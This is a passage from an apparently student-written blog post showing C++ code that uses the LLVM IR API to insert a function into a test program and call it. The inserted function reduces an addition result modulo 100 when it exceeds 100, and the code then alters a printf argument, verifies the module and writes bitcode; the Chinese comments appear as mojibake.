class="token operator">&lt;</span>Type<span class="token operator">*</span><span class="token operator">></span><span class="token function">fn_parm</span><span class="token punctuation">(</span>parms<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// åˆ›å»ºå‡½æ•°</span><span class="token keyword">auto</span> fn_prototype <span class="token operator">=</span> <span class="token class-name">FunctionType</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>builder<span class="token punctuation">.</span><span class="token function">getDoubleTy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>fn_parm<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_fn <span class="token operator">=</span> <span class="token class-name">Function</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>fn_prototype<span class="token punctuation">,</span>Function<span class="token double-colon punctuation">::</span>ExternalLinkage<span class="token punctuation">,</span><span class="token string">"work03_fn"</span><span class="token punctuation">,</span>M<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// åˆ›å»ºä¼ çš„å®å‚</span>std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>Value<span class="token operator">*</span><span class="token operator">></span>args<span class="token punctuation">;</span>args<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>in_fadd<span class="token punctuation">)</span><span class="token punctuation">;</span>ArrayRef<span class="token operator">&lt;</span>Value<span class="token operator">*</span><span class="token operator">></span> <span class="token function">argRef</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// åˆ›å»ºåŸºæœ¬å—       </span><span class="token keyword">auto</span> work03_fn_defaut<span class="token operator">=</span> <span class="token class-name">BasicBlock</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"work03_fn_defaut"</span><span class="token punctuation">,</span> work03_fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_fn_change <span class="token operator">=</span> <span class="token class-name">BasicBlock</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"work03_fn_change"</span><span class="token punctuation">,</span> work03_fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_fn_nothing <span class="token operator">=</span> <span class="token class-name">BasicBlock</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"work03_fn_nothing"</span><span class="token punctuation">,</span> work03_fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// é»˜è®¤åŸºæœ¬å— æŒ‡ä»¤æ“ä½œ</span>builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>work03_fn_defaut<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ‹¿åˆ°å‡½æ•°å‚æ•°</span><span class="token keyword">auto</span> work03_de_alloc_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateAlloca</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"ial02"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Function<span class="token double-colon punctuation">::</span>arg_iterator argsit <span class="token operator">=</span> work03_fn<span class="token operator">-></span><span class="token function">arg_begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_de_p1 <span class="token operator">=</span> argsit<span class="token punctuation">;</span><span class="token keyword">auto</span> work03_de_store_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateStore</span><span class="token punctuation">(</span>work03_de_p1<span class="token punctuation">,</span>work03_de_alloc_01<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ¯”è¾ƒå¤§å°</span><span class="token keyword">auto</span> work03_de_load_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>work03_de_alloc_01<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_de_fcmp_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateFCmpUGT</span><span class="token punctuation">(</span>work03_de_load_01<span class="token punctuation">,</span>const_100<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_de_br_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateCondBr</span><span class="token punctuation">(</span>work03_de_fcmp_01<span class="token punctuation">,</span>work03_fn_change<span class="token punctuation">,</span>work03_fn_nothing<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// å–ä½™ æŒ‡ä»¤æ“ä½œ</span>builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>work03_fn_change<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_ch_load_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>work03_de_alloc_01<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_ch_frem_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateFRem</span><span class="token punctuation">(</span>work03_ch_load_01<span class="token punctuation">,</span>const_100<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_ch_store_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateStore</span><span class="token punctuation">(</span>work03_ch_frem_01<span class="token punctuation">,</span>work03_de_alloc_01<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_ch_load02 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>work03_de_alloc_01<span class="token punctuation">)</span><span class="token punctuation">;</span>builder<span class="token punctuation">.</span><span class="token function">CreateRet</span><span class="token punctuation">(</span>work03_ch_load02<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ç¬¬ä¸‰ä¸ªåŸºæœ¬å— ä¸åšä¿®æ”¹ï¼Œè¿”å›ä»å‚æ•°ç§æ‹¿åˆ°çš„å€¼</span>builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>work03_fn_nothing<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_no_load01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>work03_de_alloc_01<span class="token punctuation">)</span><span class="token punctuation">;</span>builder<span class="token punctuation">.</span><span class="token function">CreateRet</span><span class="token punctuation">(</span>work03_no_load01<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-4-ä¿®æ”¹printfå‡½æ•°">2.4) ä¿®æ”¹printfå‡½æ•°</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * 2022-05-03 18:27:56 * TODO: * åœ¨è°ƒç”¨prtinf å‡½æ•°ä¹‹å‰æ’å…¥è°ƒç”¨å‡½æ•°æŒ‡ä»¤ * ä»¥åŠè¯»å–fadd_res, ä¿®æ”¹printf ç¬¬ä¸‰ä¸ªå‚æ•° * */</span>builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>in_prt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> in_call_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateCall</span><span class="token punctuation">(</span>work03_fn<span class="token punctuation">,</span>argRef<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> in_store03 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateStore</span><span class="token punctuation">(</span>in_call_01<span class="token punctuation">,</span>in_alloc02<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> in_load03 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>in_alloc02<span class="token punctuation">)</span><span class="token punctuation">;</span>in_prt<span class="token operator">-></span><span class="token function">setOperand</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>in_load03<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-5-2-6-éªŒè¯ä¸å†™å…¥">2.5)-2.6) éªŒè¯ä¸å†™å…¥</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * #include "llvm/IR/Verifier.h" * 2022-05-02 11:43:34 * TODO: * ä¿®æ”¹å®ŒModuleåè¿›è¡ŒéªŒè¯Moduleçš„å®Œæ•´æ€§ * verifyModule(*M,&amp;errs()): true if the module is broken.  * */</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>llvm<span class="token double-colon punctuation">::</span><span class="token function">verifyModule</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token function">errs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"debug: Module verify is ok \n"</span><span class="token punctuation">;</span>    M<span class="token operator">-></span><span class="token function">print</span><span class="token punctuation">(</span><span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * #include "llvm/Bitcode/BitcodeWriter.h" * 2022-05-03 12:55:33 * TODO: * å°†ä¿®æ”¹åçš„IR å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼Œ æ‰§è¡Œ * */</span>std<span class="token double-colon punctuation">::</span>error_code EC<span class="token punctuation">;</span>llvm<span class="token double-colon punctuation">::</span>raw_fd_ostream <span class="token function">OS</span><span class="token punctuation">(</span><span class="token string">"aftermain2.bc"</span><span class="token punctuation">,</span> EC<span class="token punctuation">,</span>llvm<span class="token double-colon punctuation">::</span>sys<span class="token double-colon punctuation">::</span>fs<span class="token double-colon punctuation">::</span><span class="token function">OpenFlags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>llvm<span class="token double-colon punctuation">::</span><span class="token function">WriteBitcodeToFile</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span>OS<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>OS<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-7-å…¨éƒ¨æºç -2">2.7) å…¨éƒ¨æºç </h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * 2022-05-03 16:16:19 * sizaif * Work3ï¼šæ’å…¥ä¸€ä¸ªå‡½æ•°å¹¶è°ƒç”¨ã€‚å‡½æ•°ç”¨äºæ£€æŸ¥åŠ æ³•ç»“æœï¼Œå¦‚æœå¤§äº 100ï¼Œåˆ™å–ä½™ 100ã€‚æ­¤å‡½æ•°ä¼šä¿®æ”¹åŠ æ³•ç»“æœã€‚(å‡½æ•°æ“ä½œ) *  * clang++ $(llvm-config --cxxflags --ldflags --system-libs --libs)  -o main2 main2.cpp * ./main2 main.ll * lli aftermain2.bc * */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Transforms/Utils/BasicBlockUtils.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;llvm/IR/IRBuilder.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/LLVMContext.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/Module.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/InstIterator.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/Instruction.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/Instructions.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/InstrTypes.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/Verifier.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IRReader/IRReader.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/CodeGen/MIRParser/MIRParser.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Support/InitLLVM.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Support/Debug.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Support/TargetSelect.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Support/SourceMgr.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;llvm/Support/raw_os_ostream.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Bitcode/BitcodeWriter.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fstream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> llvm<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     LLVMContext context<span class="token punctuation">;</span>    IRBuilder<span class="token operator">&lt;</span><span class="token operator">></span> <span class="token function">builder</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>Module<span class="token operator">></span> M<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>MIRParser<span class="token operator">></span> MIR<span class="token punctuation">;</span>    SMDiagnostic Err<span class="token punctuation">;</span>    <span class="token comment">/**     * #include "llvm/IRReader/IRReader.h"     * 2022-04-26 03:04:32     * TODO:     * from IR file get Moudle class     * */</span>    M <span class="token operator">=</span> <span class="token function">parseIRFile</span><span class="token punctuation">(</span><span class="token function">StringRef</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Err<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"debug: M is not null"</span><span class="token operator">&lt;&lt;</span>std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>        <span class="token comment">// M->print(llvm::outs(),nullptr);</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"M is null"</span><span class="token operator">&lt;&lt;</span>std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>        Err<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">errs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 2022-04-26 03:25:52     * TODO:     * è·å–mainå‡½æ•°     * */</span>    <span class="token keyword">auto</span> main_fn <span class="token operator">=</span> M<span class="token operator">-></span><span class="token function">getFunction</span><span class="token punctuation">(</span><span class="token function">StringRef</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/**     * 2022-04-28 02:14:46     * TODO:     * æ‰¾åˆ°faddæŒ‡ä»¤,ä¸faddçš„åä¸€ä¸ªæŒ‡ä»¤     * */</span>    Instruction <span class="token operator">*</span>in_fadd<span class="token punctuation">,</span><span class="token operator">*</span>in_prt<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>inst_iterator I <span class="token operator">=</span> <span class="token function">inst_begin</span><span class="token punctuation">(</span><span class="token operator">*</span>main_fn<span class="token punctuation">)</span><span class="token punctuation">,</span> E <span class="token operator">=</span> <span class="token function">inst_end</span><span class="token punctuation">(</span><span class="token operator">*</span>main_fn<span class="token punctuation">)</span><span class="token punctuation">;</span> I <span class="token operator">!=</span> E<span class="token punctuation">;</span> <span class="token operator">++</span>I<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>I<span class="token operator">-></span><span class="token function">isBinaryOp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> I<span class="token operator">-></span><span class="token function">getOpcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>Instruction<span class="token double-colon punctuation">::</span>FAdd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// outs() &lt;&lt; *I &lt;&lt; "\n";</span>            in_fadd <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token operator">*</span>I<span class="token punctuation">;</span>            in_prt <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token punctuation">(</span>I<span class="token punctuation">.</span><span class="token keyword">operator</span><span class="token operator">++</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>        <span class="token comment">/**     * 2022-04-28 02:42:32     * TODO:     * 1. åˆ›å»ºå¸¸é‡100     * 2. æ’å…¥åŸºæœ¬æŒ‡ä»¤ï¼Œå­˜å‚¨æœ€ç»ˆçš„ä¿®æ”¹faddç»“æœ     * */</span>    <span class="token keyword">auto</span> f32 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">getDoubleTy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> const_100 <span class="token operator">=</span> <span class="token class-name">ConstantFP</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span><span class="token keyword">double</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// æ’å…¥åŸºæœ¬æŒ‡ä»¤ï¼Œå­˜å‚¨æœ€ç»ˆçš„ä¿®æ”¹faddç»“æœ</span>    builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>in_prt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> in_alloc02 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateAlloca</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"ia01"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/**     * 2022-05-03 22:05:01     * TODO:     * æ–°å»ºä¸€ä¸ªå‡½æ•°:     * double work03_fn(double fdd_res)&#123;     *  if(fdd_res > 100)     *     return  fdd_res = fdd_res %100;     * &#125;else&#123;     *  return fdd_res;     * &#125;     * */</span>        <span class="token comment">// åˆ›å»ºå‡½æ•°çš„å‚æ•°</span>    std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>Type<span class="token operator">*</span><span class="token operator">></span>parms<span class="token punctuation">;</span>    parms<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>f32<span class="token punctuation">)</span><span class="token punctuation">;</span>    ArrayRef<span class="token operator">&lt;</span>Type<span class="token operator">*</span><span class="token operator">></span><span class="token function">fn_parm</span><span class="token punctuation">(</span>parms<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// åˆ›å»ºå‡½æ•°</span>    <span class="token keyword">auto</span> fn_prototype <span class="token operator">=</span> <span class="token class-name">FunctionType</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>builder<span class="token punctuation">.</span><span class="token function">getDoubleTy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>fn_parm<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_fn <span class="token operator">=</span> <span class="token class-name">Function</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>fn_prototype<span class="token punctuation">,</span>Function<span class="token double-colon punctuation">::</span>ExternalLinkage<span class="token punctuation">,</span><span class="token string">"work03_fn"</span><span class="token punctuation">,</span>M<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// åˆ›å»ºä¼ çš„å®å‚</span>    std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>Value<span class="token operator">*</span><span class="token operator">></span>args<span class="token punctuation">;</span>    args<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>in_fadd<span class="token punctuation">)</span><span class="token punctuation">;</span>    ArrayRef<span class="token operator">&lt;</span>Value<span class="token operator">*</span><span class="token operator">></span> <span class="token function">argRef</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// åˆ›å»ºåŸºæœ¬å—       </span>    <span class="token keyword">auto</span> work03_fn_defaut<span class="token operator">=</span> <span class="token class-name">BasicBlock</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"work03_fn_defaut"</span><span class="token punctuation">,</span> work03_fn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_fn_change <span class="token operator">=</span> <span class="token class-name">BasicBlock</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"work03_fn_change"</span><span class="token punctuation">,</span> work03_fn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_fn_nothing <span class="token operator">=</span> <span class="token class-name">BasicBlock</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"work03_fn_nothing"</span><span class="token punctuation">,</span> work03_fn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// é»˜è®¤åŸºæœ¬å— æŒ‡ä»¤æ“ä½œ</span>    builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>work03_fn_defaut<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// æ‹¿åˆ°å‡½æ•°å‚æ•°</span>    <span class="token keyword">auto</span> work03_de_alloc_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateAlloca</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"ial02"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Function<span class="token double-colon punctuation">::</span>arg_iterator argsit <span class="token operator">=</span> work03_fn<span class="token operator">-></span><span class="token function">arg_begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_de_p1 <span class="token operator">=</span> argsit<span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_de_store_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateStore</span><span class="token punctuation">(</span>work03_de_p1<span class="token punctuation">,</span>work03_de_alloc_01<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// æ¯”è¾ƒå¤§å°</span>    <span class="token keyword">auto</span> work03_de_load_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>work03_de_alloc_01<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_de_fcmp_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateFCmpUGT</span><span class="token punctuation">(</span>work03_de_load_01<span class="token punctuation">,</span>const_100<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_de_br_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateCondBr</span><span class="token punctuation">(</span>work03_de_fcmp_01<span class="token punctuation">,</span>work03_fn_change<span class="token punctuation">,</span>work03_fn_nothing<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// å–ä½™ æŒ‡ä»¤æ“ä½œ</span>    builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>work03_fn_change<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_ch_load_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>work03_de_alloc_01<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_ch_frem_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateFRem</span><span class="token punctuation">(</span>work03_ch_load_01<span class="token punctuation">,</span>const_100<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_ch_store_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateStore</span><span class="token punctuation">(</span>work03_ch_frem_01<span class="token punctuation">,</span>work03_de_alloc_01<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_ch_load02 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>work03_de_alloc_01<span class="token punctuation">)</span><span class="token punctuation">;</span>    builder<span class="token punctuation">.</span><span class="token function">CreateRet</span><span class="token punctuation">(</span>work03_ch_load02<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// ç¬¬ä¸‰ä¸ªåŸºæœ¬å— ä¸åšä¿®æ”¹ï¼Œè¿”å›ä»å‚æ•°ç§æ‹¿åˆ°çš„å€¼</span>    builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>work03_fn_nothing<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_no_load01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>work03_de_alloc_01<span class="token punctuation">)</span><span class="token punctuation">;</span>    builder<span class="token punctuation">.</span><span class="token function">CreateRet</span><span class="token punctuation">(</span>work03_no_load01<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 2022-05-03 18:27:56     * TODO:     * åœ¨è°ƒç”¨prtinf å‡½æ•°ä¹‹å‰æ’å…¥è°ƒç”¨å‡½æ•°æŒ‡ä»¤     * ä»¥åŠè¯»å–fadd_res, ä¿®æ”¹printf ç¬¬ä¸‰ä¸ªå‚æ•°     * */</span>    builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>in_prt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> in_call_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateCall</span><span class="token punctuation">(</span>work03_fn<span class="token punctuation">,</span>argRef<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> in_store03 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateStore</span><span class="token 